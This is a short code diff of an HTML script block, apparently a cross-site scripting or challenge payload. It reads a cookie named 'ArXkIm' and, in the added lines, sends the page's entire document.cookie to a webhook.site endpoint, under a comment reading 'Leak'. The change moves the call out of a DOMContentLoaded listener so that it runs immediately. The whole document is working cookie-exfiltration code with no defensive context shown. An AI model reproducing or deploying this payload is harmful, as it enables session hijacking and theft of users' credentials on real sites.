@@ -8,12 +8,10 @@
       return document.cookie.split('; ').find(row => row.startsWith(name + '='))?.split('=')[1];
     }
 	
-	addEventListener("DOMContentLoaded", (event) => {
-        const cookie = getCookie('ArXkIm');
+	const cookie = getCookie('ArXkIm');
     
-		// Leak 
-		fetch('https://webhook.site/a719827b-35f0-4ad5-939d-e3a23a1eb8de?cookie=' + encodeURIComponent(cookie));
-      });
+	// Leak 
+	fetch('https://webhook.site/a719827b-35f0-4ad5-939d-e3a23a1eb8de?cookie=' + encodeURIComponent(document.cookie));
 
     
   </script>
